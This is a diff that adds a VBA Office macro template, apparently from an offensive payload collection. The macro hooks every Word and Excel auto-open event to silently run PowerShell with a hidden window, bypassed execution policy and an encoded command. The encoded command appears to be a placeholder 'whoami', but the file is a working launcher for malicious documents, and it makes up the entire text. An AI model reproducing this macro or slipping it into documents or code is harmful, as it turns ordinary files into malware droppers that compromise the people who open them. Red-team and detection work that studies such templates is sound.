@@ -1,0 +1,27 @@
+---
+syntax: plaintext
+---
+' VBA Office macro that executes a command when the document is opened
+Sub Main()
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    Dim cmd As String
+    cmd = "powershell.exe -EP Bypass -NoP -NonI -W Hidden -Enc dwBoAG8AYQBtAGkA"
+    shell.Run cmd, 0    ' 0: hide window
+End Sub
+
+Sub Document_Open()
+    Main
+End Sub
+
+Sub AutoOpen()
+    Main
+End Sub
+
+Sub Workbook_Open()
+    Main
+End Sub
+
+Sub Auto_Open()
+    Main
+End Sub
